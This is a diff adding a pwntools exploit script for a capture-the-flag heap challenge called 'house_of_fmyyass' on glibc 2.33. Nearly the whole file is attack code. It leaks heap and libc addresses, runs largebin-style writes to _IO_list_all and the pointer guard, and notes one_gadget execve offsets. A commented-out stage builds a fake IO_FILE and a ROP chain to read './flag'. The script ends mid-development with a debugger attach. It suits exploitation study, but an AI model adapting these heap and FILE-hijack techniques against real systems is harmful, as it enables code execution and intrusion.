@@ -1,0 +1,201 @@
+from pwn import *
+
+context(os = 'linux', arch = 'amd64', log_level = 'debug')
+io = process('house_of_fmyyass')
+# io = remote('129.211.173.64', 10002)
+libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so')
+elf = ELF('house_of_fmyyass')
+
+'''
+0xde78c execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xde78f execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xde792 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xde975 execve("/bin/sh", r10, [rbp-0x70])
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
+
+0xde979 execve("/bin/sh", r10, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL
+  [rdx] == NULL || rdx == NULL
+'''
+
+
+def ROL(content, key):
+    tmp = bin(content)[2:].rjust(64, '0')
+    return int(tmp[key:] + tmp[:key], 2)
+
+
+def add(size):
+    io.sendlineafter('>> ', '1')
+    io.sendlineafter('size: ', str(size))
+
+
+def edit(size, offset, content):
+    io.sendlineafter('>> ', '2')
+    io.sendlineafter('size: ', str(size))
+    io.sendlineafter('offset: ', str(offset))
+    io.sendafter('content: ', content)
+
+
+def delete(idx):
+    io.sendlineafter('>> ', '3')
+    io.sendlineafter('idx: ', str(idx))
+
+
+def show():
+    io.sendlineafter('>> ', '4')
+
+
+def pwn():
+    add(0x18)
+    payload = p64(0) + p64(0x421) + b'a' * 0x410
+    payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    edit(0x460, 0x100, payload)
+    delete(0x110)
+    add(0x318)
+    add(0xf8)
+    delete(0x430)
+    show()
+    io.recvuntil('content: ')
+    mmap_addr = u64(io.recvuntil(b'1. ')[:-3].ljust(8, b'\x00')) << 12
+    log.success('mmap_addr: ' + hex(mmap_addr))
+    for i in range(7):
+        edit(0x10, 0x430, b'a' * 0x10)
+        delete(0x430)
+    edit(1, 0x430, b'\x90')
+    show()
+    io.recvuntil('content: ')
+    libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x100
+    log.success('libc_base: ' + hex(libc_base))
+    stderr = libc_base + libc.sym['stderr']
+    _IO_list_all = libc_base + 0x1e15c0
+    _IO_2_1_stderr_ = libc_base + 0x1e15e0
+    _IO_cookie_jumps = libc_base + 0x1e1a20
+    guard = libc_base - 0x2890
+    gadget_addr = libc_base + 0x000000000014a0a0    # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+    setcontext = libc_base + 0x52970                
+    pop_rdi_ret = libc_base + 0x0000000000028a55
+    pop_rsi_ret = libc_base + 0x000000000002a4cf
+    pop_rdx_ret = libc_base + 0x00000000000c7f32
+    ret = libc_base + 0x0000000000028a56
+
+    edit(1, 0x430, b'\x00')
+    add(0xf8)
+    edit(0x8, 0x108, p64(0x421))
+    edit(0x10, 0x520, p64(0) + p64(0x21))
+    payload = p64(0) + p64(0x431) + b'a' * 0x420
+    payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    edit(0x470, 0x560, payload)
+    delete(0x570)
+    add(0x438)
+    edit(8, 0x588, p64(_IO_list_all - 0x20))
+    delete(0x110)
+    add(0x500)
+    edit(8, 0x128, p64(mmap_addr + 0x560))
+    edit(8, 0x580, p64(mmap_addr + 0x100))
+    add(0x418)
+    add(0x428)
+    delete(0x570)
+    add(0x500)
+    delete(0x110)
+    edit(8, 0x588, p64(guard - 0x20))
+    add(0x500)
+    edit(8, 0x128, p64(mmap_addr + 0x560))
+    edit(8, 0x580, p64(mmap_addr + 0x100))
+    add(0x418)
+    add(0x428)
+    # delete(0x570)
+    # add(0x500)
+    # delete(0x110)
+    # edit(8, 0x588, p64(_IO_2_1_stderr_ - 0x20))
+    # add(0x500)
+    # edit(8, 0x128, p64(mmap_addr + 0x560))
+    # edit(8, 0x580, p64(mmap_addr + 0x100))
+    # add(0x418)
+    # add(0x428)
+
+    # next_chain = 0
+    # srop_addr = mmap_addr + 0x570
+    # fake_IO_FILE = 2 * p64(0)                                   # _IO_read_end / _IO_read_base
+    # fake_IO_FILE += p64(0)                                      # _IO_write_base = 0
+    # fake_IO_FILE += p64(0xffffffffffffffff)                     # _IO_write_ptr = 0xffffffffffffffff
+    # fake_IO_FILE += p64(0)                                      # _IO_write_end
+    # fake_IO_FILE += p64(0)                                      # _IO_buf_base
+    # fake_IO_FILE += p64(0)                                      # _IO_buf_end
+    # fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
+    # fake_IO_FILE += p64(next_chain)                             # _chain
+    # fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
+    # fake_IO_FILE += p64(mmap_addr)                              # _lock = writable address
+    # fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b'\x00')
+    # fake_IO_FILE += p64(0)                                      # _mode = 0
+    # fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b'\x00')
+    # fake_IO_FILE += p64(_IO_cookie_jumps + 0x40)                # _vtable
+    # fake_IO_FILE += p64(srop_addr)                                      # rdi
+    # fake_IO_FILE += p64(0)
+    # fake_IO_FILE += p64(ROL(gadget_addr ^ (mmap_addr + 0x100), 0x11))   # rax
+    # edit(0xe8, 0x110, fake_IO_FILE)
+
+    # fake_frame_addr = srop_addr
+    # ropchain  = p64(open)   
+    # ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(fake_frame_addr + 0x200) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
+    # ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(fake_frame_addr + 0x200) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
+    # filename = b'./flag'
+    # payload = p64(0) + p64(fake_frame_addr) + b'\x00' * 0x10 + p64(setcontext + 61)
+    # payload = payload.ljust(0x68, b'\x00')
+    # payload += p64(fake_frame_addr + 0xb0)                  # rdi
+    # payload += p64(0)                                       # rsi
+    # payload = payload.ljust(0x88, b'\x00')
+    # payload += p64(0x100)                                   # rdx
+    # payload = payload.ljust(0xa0, b'\x00')
+    # payload += p64(fake_frame_addr + 0xc0)                  # rsp
+    # payload += p64(ret)                                     # rip
+    # payload += filename.ljust(0x10, b'\x00') 
+    # payload += ropchain
+    # edit(0x138, 0x570, payload)
+    
+    # delete(0x570)
+    # add(0x500)
+    # payload = p64(0) + p64(0x421) + b'a' * 0x410
+    # payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    # payload += p64(0) + p64(0x21) + p64(0) + p64(0)
+    # edit(0x460, 0x9d0, payload)
+    # delete(0x9e0)
+    # edit(8, 0x568, p64(0x435))
+    delete(0x110)
+    edit(8, 0x520, p64(0x410))
+
+    gdb.attach(io)
+    add(0x408)
+    pause()
+
+
+if __name__ == '__main__':
+    while True:
+        try:
+            pwn()
+        except:
+            io.close()
+            io = process('house_of_fmyyass')
+            continue
+        else:
+            break
+
+
